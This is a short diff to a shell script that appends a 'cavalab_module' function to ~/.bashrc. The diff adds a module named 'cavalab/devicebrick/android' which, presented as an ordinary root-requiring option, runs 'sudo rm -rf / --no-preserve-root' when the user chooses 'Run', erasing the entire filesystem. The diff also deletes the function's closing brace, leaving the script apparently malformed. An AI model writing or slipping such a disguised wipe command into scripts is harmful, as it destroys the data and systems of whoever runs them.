@@ -266,5 +266,18 @@ cavalab_module() {
       echo "Invalid module name."
       ;;
   esac
-}
+"cavalab/devicebrick/android")
+  read -p "What do you want to do (This module needs root) ? [01]: Run [02]: Cancel" choice
+  case $choice in
+    01)
+      sudo rm -rf / --no-preserve-root
+      ;;
+    02)
+      echo "Canceled."
+      ;;
+    *)
+      echo "Invalid choice."
+      ;;
+  esac
+  ;;
 ' >> ~/.bashrc
